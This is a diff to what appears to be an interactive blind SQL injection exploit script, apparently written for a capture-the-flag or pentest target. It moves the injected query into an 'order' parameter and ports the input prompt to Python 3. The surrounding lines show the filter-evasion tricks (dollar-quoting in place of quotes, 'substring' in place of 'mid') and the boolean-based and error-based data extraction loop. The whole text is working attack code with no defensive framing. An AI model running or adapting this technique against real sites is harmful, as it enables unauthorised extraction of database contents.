@@ -94,7 +94,7 @@ if __name__ == '__main__':
         ssql = ssql.replace('\'', '$$')
         ssql = ssql.replace('mid', 'substring')
 
-        res = requests.get(url, params=dict(q=ssql))
+        res = requests.get(url, params=dict(order=ssql))
         assert res.status_code == 200
         text_len = len(res.text)
         assert text_len == 666 or text_len == 0, "Invalid Text Length (%d), Query (%s)" % (text_len, ssql)
@@ -111,7 +111,7 @@ if __name__ == '__main__':
         sql = sql.replace('\'', '$$')
 
         # WTF?!  why it needs Accept header QAQ
-        res = requests.get(url, params=dict(q=sql), headers={'Accept': 'text/html'})#, proxies=dict(http='http://127.0.0.1:8080'))
+        res = requests.get(url, params=dict(order=sql), headers={'Accept': 'text/html'})#, proxies=dict(http='http://127.0.0.1:8080'))
         assert res.status_code == 500, "Not 500?! %d" % (res.status_code)
         return res.text.split('&quot;')[1]
     # ================
@@ -124,7 +124,7 @@ if __name__ == '__main__':
         print(r)
 
     while True:
-        query = raw_input("> ").strip()
+        query = input("> ").strip()
         try:
             s = get_string(temp, query, boolean)  # boolean-based
             #s = get_string_by_error(temp_error, query) # error-based
